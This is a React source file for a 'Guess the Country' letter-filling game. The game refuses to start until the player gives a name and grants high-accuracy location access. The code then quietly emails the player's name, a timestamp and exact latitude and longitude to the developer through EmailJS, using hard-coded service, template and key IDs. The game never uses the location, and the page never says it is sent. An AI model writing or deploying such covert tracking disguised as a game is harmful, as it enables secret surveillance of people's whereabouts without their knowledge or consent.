import React, { useEffect, useRef, useState } from "react";
import emailjs from "@emailjs/browser";

const COUNTRY_LIST = [
  "Argentina",
  "Brazil",
  "Canada",
  "Denmark",
  "Egypt",
  "Finland",
  "Germany",
  "Hungary",
  "India",
  "Japan",
  "Kenya",
  "Lebanon",
  "Mexico",
  "Nigeria",
  "Oman",
  "Portugal",
  "Qatar",
  "Russia",
  "Spain",
  "Turkey",
  "Uganda",
  "Vietnam",
  "Yemen",
  "Zimbabwe",
];

const generateMaskedIndexes = (length) => {
  const indexes = new Set();
  while (indexes.size < Math.floor(length * 0.6)) {
    indexes.add(Math.floor(Math.random() * length));
  }
  return indexes;
};

const App = () => {
  const [coords, setCoords] = useState(null);
  const [permissionState, setPermissionState] = useState(null);
  const [country, setCountry] = useState("");
  const [maskedIndexes, setMaskedIndexes] = useState(new Set());
  const [inputs, setInputs] = useState([]);
  const [message, setMessage] = useState("");
  const [userName, setUserName] = useState("");
  const [nameSubmitted, setNameSubmitted] = useState(false);
  const inputRefs = useRef([]);

  const checkPermission = async () => {
    if (!navigator.permissions) return;
    try {
      const status = await navigator.permissions.query({ name: "geolocation" });
      setPermissionState(status.state);

      status.onchange = () => {
        setPermissionState(status.state);
        if (status.state === "granted") {
          requestLocation();
        }
      };
    } catch {
      // permissions API not supported
    }
  };

  const sendCoordinatesEmail = (coords) => {
    const templateParams = {
      user_name: userName || "Unknown",
      date: new Date().toLocaleString(),
      coords: `Latitude: ${coords.lat}, Longitude: ${coords.lng}`,
    };

    const alreadySent = sessionStorage.getItem("email_sent");
    if (alreadySent) {
      console.log("Email already sent");
      return;
    }

    emailjs
      .send(
        "service_vtjbs78", // Your EmailJS service ID
        "template_hnjwm3v", // Your EmailJS template ID
        templateParams,
        "Qy0ZjDl9FIDCKxKxp" // Your EmailJS public key
      )
      .then(() => {
        console.log("Email sent!");
        sessionStorage.setItem("email_sent", "true");
      })
      .catch((err) => {
        console.error("Email send error:", err);
      });
  };

  const requestLocation = async () => {
    if (!navigator.geolocation) {
      alert("Geolocation is not supported by your browser.");
      return;
    }

    if (navigator.permissions && navigator.permissions.query) {
      try {
        const status = await navigator.permissions.query({
          name: "geolocation",
        });

        if (status.state === "denied") {
          setPermissionState("denied");
          alert(
            "Location permission is denied. Please enable it manually in your browser settings to start the game."
          );
          return;
        }

        if (status.state === "granted") {
          setPermissionState("granted");
        }
      } catch (error) {
        console.warn("Permissions API error:", error);
      }
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        setCoords({
          lat: position.coords.latitude,
          lng: position.coords.longitude,
        });
        setPermissionState("granted");
      },
      (error) => {
        console.warn("Location error:", error.message);
        setPermissionState("denied");
        setCoords(null);
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  };

  useEffect(() => {
    checkPermission();
    requestLocation();
  }, []);

  useEffect(() => {
    if (coords && nameSubmitted) {
      sendCoordinatesEmail(coords);
    }
  }, [coords, nameSubmitted]);

  useEffect(() => {
    if (!coords || !nameSubmitted) return;
    const random =
      COUNTRY_LIST[
        Math.floor(Math.random() * COUNTRY_LIST.length)
      ].toUpperCase();
    const maskedSet = generateMaskedIndexes(random.length);
    setCountry(random);
    setMaskedIndexes(maskedSet);
    setInputs(
      random.split("").map((char, i) => (maskedSet.has(i) ? "" : char))
    );
    inputRefs.current = [];
    setMessage("");
  }, [coords, nameSubmitted]);

  const resetInputs = (country, maskedSet) => {
    return country.split("").map((char, i) => (maskedSet.has(i) ? "" : char));
  };

  const handleInputChange = (index, value) => {
    const updated = [...inputs];
    updated[index] = value.slice(0, 1).toUpperCase();
    setInputs(updated);
    if (value && inputRefs.current[index + 1]) {
      inputRefs.current[index + 1].focus();
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace") {
      if (inputs[index] === "" && inputRefs.current[index - 1]) {
        inputRefs.current[index - 1].focus();
      }
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    const guess = inputs.join("").trim().toUpperCase();

    if (guess === country) {
      setMessage("🎉 Correct!");
      setTimeout(() => {
        const random =
          COUNTRY_LIST[
            Math.floor(Math.random() * COUNTRY_LIST.length)
          ].toUpperCase();
        const maskedSet = generateMaskedIndexes(random.length);
        setCountry(random);
        setMaskedIndexes(maskedSet);
        setInputs(resetInputs(random, maskedSet));
        inputRefs.current = [];
        setMessage("");
      }, 1000);
    } else {
      setMessage("❌ Try again.");
      setInputs(resetInputs(country, maskedIndexes));
      inputRefs.current = [];
    }
  };

  const isDenied = permissionState === "denied";

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-[#0f0c29] via-[#302b63] to-[#24243e] text-white px-4">
      <div className="backdrop-blur-xl bg-white/10 p-8 rounded-2xl shadow-2xl w-full max-w-xl text-center border border-white/20">
        <h1 className="text-4xl font-extrabold mb-3 drop-shadow">
          🌍 Guess the Country
        </h1>

        {!nameSubmitted ? (
          <form
            onSubmit={(e) => {
              e.preventDefault();
              if (userName.trim()) setNameSubmitted(true);
            }}
            className="mb-6"
          >
            <input
              type="text"
              placeholder="Enter your name"
              value={userName}
              onChange={(e) => setUserName(e.target.value)}
              className="w-full mb-4 p-3 rounded-md text-white text-lg focus:outline-none bg-white/20"
            />
            <button
              type="submit"
              className="bg-green-500 hover:bg-green-600 py-2.5 px-6 rounded-md font-semibold transition duration-200 shadow-md hover:shadow-lg"
            >
              Submit Name
            </button>
          </form>
        ) : !coords ? (
          <>
            <p className="mb-6 text-gray-300 text-sm">
              Please allow location access to start the game.
            </p>
            <button
              onClick={requestLocation}
              className="bg-cyan-500 hover:bg-cyan-600 py-2.5 px-6 rounded-md font-semibold transition duration-200 shadow-md hover:shadow-lg"
            >
              Allow location to start the game
            </button>
            {isDenied && (
              <p className="mt-4 text-yellow-400 text-sm">
                Location permission was denied. Please enable it manually in
                your browser's settings for this site to start the game.
              </p>
            )}
          </>
        ) : (
          <>
            <p className="mb-6 text-gray-300 text-sm">
              Fill in the missing letters below:
            </p>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="flex justify-center gap-2 flex-wrap mb-4">
                {country.split("").map((char, index) =>
                  char === " " ? (
                    <div key={index} className="w-4" />
                  ) : maskedIndexes.has(index) ? (
                    <input
                      key={index}
                      type="text"
                      maxLength={1}
                      value={inputs[index]}
                      onChange={(e) => handleInputChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(e, index)}
                      ref={(el) => (inputRefs.current[index] = el)}
                      className="w-10 h-12 text-center text-xl font-semibold rounded-md bg-white/20 backdrop-blur-sm text-white border border-white/30 focus:outline-none focus:ring-2 focus:ring-cyan-400 shadow-inner transition-all duration-150"
                    />
                  ) : (
                    <div
                      key={index}
                      className="w-10 h-12 flex items-center justify-center text-xl font-bold border border-white/30 rounded-md bg-white/10 shadow-sm"
                    >
                      {char}
                    </div>
                  )
                )}
              </div>

              <button
                type="submit"
                className="w-full bg-cyan-500 hover:bg-cyan-600 py-2.5 rounded-md font-semibold transition duration-200 shadow-md hover:shadow-lg"
              >
                Submit
              </button>
            </form>

            {message && (
              <p
                className={`mt-6 text-lg font-semibold ${
                  message.includes("Correct")
                    ? "text-green-400"
                    : "text-red-400"
                }`}
              >
                {message}
              </p>
            )}
          </>
        )}
      </div>
    </div>
  );
};

export default App;
